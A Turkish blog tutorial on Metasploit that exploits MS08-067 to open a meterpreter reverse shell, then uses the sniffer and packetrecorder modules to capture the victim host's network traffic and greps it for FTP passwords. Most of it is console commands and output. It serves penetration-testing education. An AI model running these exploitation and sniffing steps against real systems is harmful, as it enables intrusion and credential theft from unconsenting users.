---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-05T13:32:00Z"
excerpt: Metasploit Framework kullanarak bir hedef bilgisayarda meterpreter shell
  açtığınızda, bağlandığınız bilgisayarın ağda yaptığı haberleşme esnasında gönderilen
  ve alınan bilgileri görmek isteyebilirsiniz. Bu işleme paket dinleme adı verilmektedir.
guid: https://www.siberoloji.com/?p=1189
id: 1189
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Paket Dinleme
url: /tr/msf-paket-dinleme/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="paket-dinleme">Paket Dinleme 
<!-- /wp:heading -->

  Metasploit Framework kullanarak bir hedef bilgisayarda meterpreter shell açtığınızda, bağlandığınız bilgisayarın ağda yaptığı haberleşme esnasında gönderilen ve alınan bilgileri görmek isteyebilirsiniz. Bu işleme&nbsp;<strong>paket dinleme</strong>&nbsp;adı verilmektedir. 
 

  Meterpreter,&nbsp;<code>sniffer</code>&nbsp;modülü ile bu trafiği kaydedebilirsiniz. Toplamda 200.000 pakete kadar kayıt yapabilen&nbsp;<code>sniffer</code>&nbsp;modülü, paketleri PCAP formatında kaydeder. Böylece PCAP dosyasını&nbsp;<code>psnuffle, dsniff veya wireshark</code>&nbsp;programlarıyla analiz edebilirsiniz. 
 

  Meterpreter&nbsp;<code>sniffer</code>&nbsp;eklentisi MicroOLAP Packet Sniffer SDK kullanır. Paketleri dinlemek için diskin herhangi bir yerinden veri alıp verme işlemi yapmaz. Ayrıca, meterpreter tarafından oluşturulan paketler kayıt dışı tutarak karışıklığın önüne de geçer. Meterpreter tarafından yakalanan veriler, bilgisayarımıza SSL/TLS kullanılarak şifreli olarak aktarılır. 
 

 
<h2 class="wp-block-heading" id="meterpreter-oturum-açalım">Meterpreter Oturum Açalım</h2>
<!-- /wp:heading -->

  Öncelikle keşfettiğiniz bir servis veya zafiyeti kullanarak meterpreter oturumu açmalısınız. Aşağıda örneğini görebilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> use exploit/windows/smb/ms08_067_netapi
msf exploit<strong>(</strong>ms08_067_netapi<strong>)</strong> <strong>&gt;</strong> set PAYLOAD windows/meterpeter/reverse_tcp
msf exploit<strong>(</strong>ms08_067_netapi<strong>)</strong> <strong>&gt;</strong> set LHOST 10.211.55.126
msf exploit<strong>(</strong>ms08_067_netapi<strong>)</strong> <strong>&gt;</strong> set RHOST 10.10.1.119
msf exploit<strong>(</strong>ms08_067_netapi<strong>)</strong> <strong>&gt;</strong> exploit

<strong>[</strong><strong>*</strong><strong>]</strong> Handler binding to LHOST 0.0.0.0
<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse handler
<strong>[</strong><strong>*</strong><strong>]</strong> Triggering the vulnerability...
<strong>[</strong><strong>*</strong><strong>]</strong> Transmitting intermediate stager <strong>for </strong>over-sized stage...<strong>(</strong>216 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>205824 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 1 opened <strong>(</strong>10.10.1.4:4444 -&gt; 10.10.1.119:1921<strong>)</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="sinffer-modülünü-yükleyelim">Sinffer Modülünü Yükleyelim</h2>
<!-- /wp:heading -->

  Meterpreter oturumu açıldığında&nbsp;<code>use sniffer</code>&nbsp;komutuyla eklentiyi aktif hale getirmeliyiz. Ardında&nbsp;<code>help</code>&nbsp;komutunu verdiğinizde, yardım listesinde&nbsp;<code>sniffer</code>&nbsp;ile ilgili kullanılabilir durumda olan komutları görebilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> use sniffer
Loading extension sniffer...success.

meterpreter <strong>&gt;</strong> help

Sniffer Commands
<strong>================</strong>

     Command             Description
     -------             -----------
     sniffer_dump        Retrieve captured packet data
     sniffer_interfaces  List all remote sniffable interfaces
     sniffer_start       Capture packets on a previously opened interface
     sniffer_stats       View statistics of an active capture
     sniffer_stop        Stop packet captures on the specified interface
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="dinlenebilir-arayüzler">Dinlenebilir Arayüzler</h2>
<!-- /wp:heading -->

  Hedef sistemde hangi ağ arayüzlerinin aktif olduğunu görmek için&nbsp;<code>sniffer_interfaces</code>&nbsp;komutunu kullanarak listeyi inceliyoruz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> sniffer_interfaces

1 - 'VMware Accelerated AMD PCNet Adapter' <strong>(</strong> type:0 mtu:1514 usable:true dhcp:true wifi:false <strong>)</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="dinlemeye-başlama">Dinlemeye Başlama</h2>
<!-- /wp:heading -->

  Bizim örneğimizde 1 adet arayüz bulunmaktadır. Bu ağ cihazını dinlemek için&nbsp;<code>sniffer_start 1</code>&nbsp;komutunu veriyoruz. Bilgiler&nbsp;<code>/tmp/all.cap</code>&nbsp;dosyasına kayıt edilecektir. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> sniffer_start 1
<strong>[</strong><strong>*</strong><strong>]</strong> Capture started on interface 1 <strong>(</strong>200000 packet buffer<strong>)</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="kayıtları-kontrol-etme">Kayıtları Kontrol Etme</h2>
<!-- /wp:heading -->

  Dinleme işlemi devam ederken, ne kadar paketin kayıt edildiğini görmek için&nbsp;<code>sniffer_dump</code>&nbsp;komutunu kullanarak kaç adet paketin dosyaya yazıldığını görebilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> sniffer_dump 1 /tmp/all.cap
<strong>[</strong><strong>*</strong><strong>]</strong> Dumping packets from interface 1...
<strong>[</strong><strong>*</strong><strong>]</strong> Wrote 19 packets to PCAP file /tmp/all.cap

meterpreter <strong>&gt;</strong> sniffer_dump 1 /tmp/all.cap
<strong>[</strong><strong>*</strong><strong>]</strong> Dumping packets from interface 1...
<strong>[</strong><strong>*</strong><strong>]</strong> Wrote 199 packets to PCAP file /tmp/all.cap
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="packetrecorder-eklentisi">packetrecorder Eklentisi</h2>
<!-- /wp:heading -->

  Meterpreter&nbsp;<code>sniffer</code>&nbsp;eklentisinin yanında paket dinleme için geliştirilen&nbsp;<code>packetrecorder</code>&nbsp;script kodlarını da kullanabilirsiniz. Bu modül, paket kayıtlarını belirli zaman aralıklarına bölmenizi sağlar. Örneğin 30 Saniye aralıklarla kayıt yapmak isteyebilirsiniz. 
 

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading" id="packetrecorder-aktif-hale-getirelim">packetrecorder Aktif Hale Getirelim</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run packetrecorder 
Meterpreter Script <strong>for </strong>capturing packets <strong>in </strong>to a PCAP file
on a target host given a interface ID.

OPTIONS:

    -h        Help menu.
    -i   Interface ID number where all packet capture will be <strong>done</strong>.
    -l   Specify and alternate folder to save PCAP file.
    -li        List interfaces that can be used <strong>for </strong>capture.
    -t   Time interval <strong>in </strong>seconds between recollection of packet, default 30 seconds.
</code></pre>
<!-- /wp:code -->

  Dinlemeye başlamadan önce, dinlenebilir arayüzlerin listesini kontrol edelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run packetrecorder -li

1 - 'Realtek RTL8139 Family PCI Fast Ethernet NIC' <strong>(</strong> type:4294967295 mtu:0 usable:false dhcp:false wifi:false <strong>)</strong>
2 - 'Citrix XenServer PV Ethernet Adapter' <strong>(</strong> type:0 mtu:1514 usable:true dhcp:true wifi:false <strong>)</strong>
3 - 'WAN Miniport (Network Monitor)' <strong>(</strong> type:3 mtu:1514 usable:true dhcp:false wifi:false <strong>)</strong>
</code></pre>
<!-- /wp:code -->

  Bu örneğimizde 3 adet ağ cihazı olduğunu görüyoruz.&nbsp;<code>-i 2</code>&nbsp;seçeneği ile 2 numaralı arayüzü dinleyeceğimizi belirtmiş oluyoruz.&nbsp;<code>-l /root/</code>&nbsp;seçeneği ile PCAP dosyasının nereye kayıt edileceğini belirliyoruz. Dinleme başladığından bir süre sonra işlemi bitirmek için&nbsp;<code>CTRL+C</code>&nbsp;tuşlarını kullanabilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run packetrecorder -i 2 -l /root/
<strong>[</strong><strong>*</strong><strong>]</strong> Starting Packet capture on interface 2
<strong>[</strong>+] Packet capture started
<strong>[</strong><strong>*</strong><strong>]</strong> Packets being saved <strong>in </strong>to /root/logs/packetrecorder/XEN-XP-SP2-BARE_20101119.5105/XEN-XP-SP2-BARE_20101119.5105.cap
<strong>[</strong><strong>*</strong><strong>]</strong> Packet capture interval is 30 Seconds
^C
<strong>[</strong><strong>*</strong><strong>]</strong> Interrupt 
<strong>[</strong>+] Stopping Packet sniffer...
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

  Kayıt edilen PCAP dosyasını&nbsp;<code>wireshark</code>&nbsp;veya&nbsp;<code>tshark</code>&nbsp;programıyla analiz edebilirsiniz. Aşağıda&nbsp;<code>tshark</code>&nbsp;komutuna ait bir örnek bulunmaktadır. Örnek komutta, paketlerin içinde geçen&nbsp;<code>PASS</code>&nbsp;ifadesinin bulunduğu paketler aranmaktadır. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~/logs/packetrecorder/XEN-XP-SP2-BARE_20101119.5105# tshark -r XEN-XP-SP2-BARE_20101119.5105.cap |grep PASS
Running as user "root" and group "root". This could be dangerous.
2489  82.000000 192.168.1.201 -&gt; 209.132.183.61 FTP Request: PASS s3cr3t
2685  96.000000 192.168.1.201 -&gt; 209.132.183.61 FTP Request: PASS s3cr3t</code></pre>
<!-- /wp:code -->